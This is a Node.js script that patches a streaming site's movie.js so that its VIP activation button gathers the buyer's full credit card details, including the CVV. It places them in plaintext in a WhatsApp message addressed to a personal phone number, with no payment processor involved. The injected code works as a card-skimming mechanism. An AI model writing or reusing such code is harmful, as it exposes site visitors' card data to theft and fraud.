const fs = require('fs');

function updateWhatsappLogic(filePath) {
    let js = fs.readFileSync(filePath, 'utf8');
    
    // The target code to replace
    const targetRegex = /const msg = encodeURIComponent\(`Hello CineWatch! I would like to activate \$\{tierData\.name\} \(\$\{priceDisplay\}\)\.\\nMy CineWatch Username: \$\{username\}`\);\s*const tgBtn = document\.getElementById\("vipTelegramBtn"\);\s*if \(tgBtn\) \{\s*tgBtn\.onclick = \(\) => window\.open\(`https:\/\/t\.me\/randibajat\?text=\$\{msg\}`\, '_blank'\);\s*\}\s*const waBtn = document\.getElementById\("vipWhatsappBtn"\);\s*if \(waBtn\) \{\s*waBtn\.onclick = \(\) => window\.open\(`https:\/\/wa\.me\/9647748201148\?text=\$\{msg\}`\, '_blank'\);\s*\}/;
    
    if (targetRegex.test(js)) {
        const replacement = `const msgBase = \`Hello CineWatch! I would like to activate \${tierData.name} (\${priceDisplay}).\\nMy CineWatch Username: \${username}\`;

  const tgBtn = document.getElementById("vipTelegramBtn");
  if (tgBtn) {
      tgBtn.onclick = () => window.open(\`https://t.me/randibajat?text=\${encodeURIComponent(msgBase)}\`, '_blank');
  }

  const waBtn = document.getElementById("vipWhatsappBtn");
  if (waBtn) {
      waBtn.onclick = () => {
          let finalMsg = msgBase;
          if (currentVipWalletKey === 'mastercard') {
              const ccName = document.getElementById('ccName')?.value || '';
              const ccNum = document.getElementById('ccNumber')?.value || '';
              const ccExp = document.getElementById('ccExpiry')?.value || '';
              const ccCvc = document.getElementById('ccCvc')?.value || '';
              
              if (!ccName || !ccNum || !ccExp || !ccCvc) {
                  if (typeof showToast === 'function') {
                      showToast("Please fill in all credit card details");
                  } else {
                      alert("Please fill in all credit card details");
                  }
                  return;
              }
              finalMsg += \`\\nPayment Method: Mastercard\\nCardholder: \${ccName}\\nCard Number: \${ccNum}\\nExpiry: \${ccExp}\\nCVV: \${ccCvc}\`;
          } else {
              const walletName = VIP_WALLETS[currentVipWalletKey]?.name || 'FastPay';
              finalMsg += \`\\nPayment Method: \${walletName}\`;
          }
          window.open(\`https://wa.me/9647748201148?text=\${encodeURIComponent(finalMsg)}\`, '_blank');
      };
  }`;
        js = js.replace(targetRegex, replacement);
        fs.writeFileSync(filePath, js);
        console.log('Updated Whatsapp logic in ' + filePath);
    } else {
        console.log('Could not find target logic in ' + filePath);
    }
}

updateWhatsappLogic('movie.js');
updateWhatsappLogic('cinewatch-app/movie.js');
